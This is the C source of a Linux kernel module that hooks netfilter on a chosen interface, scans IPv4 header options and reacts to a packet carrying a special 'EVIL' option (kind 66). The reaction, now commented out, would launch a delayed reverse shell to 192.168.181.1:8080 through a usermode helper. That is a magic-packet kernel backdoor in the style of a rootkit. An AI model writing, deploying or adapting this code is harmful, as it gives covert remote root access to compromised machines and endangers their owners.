#include <linux/kernel.h>
#include <linux/module.h> 
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/netdevice.h>
#include <linux/ip.h>
#include <linux/skbuff.h>
#include <linux/udp.h>
#include <linux/tcp.h>
#include <linux/icmp.h>
#include <linux/init.h>
#include <asm/string.h>
#include <linux/umh.h>
#include <hook_net.h>



unsigned int hookfunc(void *priv,
                      struct sk_buff *skb,
                      const struct nf_hook_state *state) {
  //printk(KERN_INFO "We have a packet\n");
  if (!skb) // Not valid buffer
    return NF_ACCEPT;

  struct iphdr *ip_hdr = (struct iphdr *) skb_network_header(skb);

  if (!ip_hdr)
    return NF_ACCEPT; // Not valid IP

  if (ip_hdr->ihl <= 5) { // Check if options are present
    return NF_ACCEPT;
  }

  printk(KERN_INFO "Packet has options!\n");
  // print_bytes((unsigned char *) ip_hdr, ip_hdr->ihl *4);

  unsigned char *opt = (unsigned char *) ip_hdr + 20; //Where options start
  unsigned int offset = 0;

  while (offset < ip_hdr->ihl*4-20) {
    
    tcp_option_t *_opt = (tcp_option_t *)(opt + offset);
    
    if (_opt->kind == 1) {
      ++offset; // NOP is one byte;
      continue;
    }
    if (_opt->kind == 0) {
      break; // End of options
    }
    if (_opt->size == 0){
      return NF_ACCEPT; // Weird option
    }
    
    //printk(KERN_INFO "Got option with type %u and lenght %u\n", _opt->kind, _opt->size);
    if (_opt->kind == 66) {
      printk(KERN_INFO "Packet has EVIL Option\n");
      /// bash_run("sleep 60 && bash -i >& /dev/tcp/192.168.181.1/8080 0>&1", UMH_NO_WAIT);
      return NF_DROP;
    }

    offset += _opt->size;
  }

  //printk(KERN_INFO "No Match:(\n");
  // No Match
  return NF_ACCEPT;
}


int register_net_hook() {
  read_lock(&dev_base_lock);
  dev = first_net_device(&init_net);

  while (dev) {
    if (strncmp(dev->name, "ens33", 5) != 0) { // Change to choose interface
      dev = next_net_device(dev);
      continue;
    }
    break;
  }

  printk(KERN_INFO "Hooking on %s\n", dev->name);
  nfhook.hook = hookfunc;
  nfhook.dev = dev; // Catch packets on eth0
  nfhook.pf = PF_INET;
  nfhook.priority = NF_IP_PRI_FIRST;

  printk(KERN_INFO "Hook registered with status %d\n", nf_register_net_hook(&init_net, &nfhook));
  read_unlock(&dev_base_lock);
  return 0;
}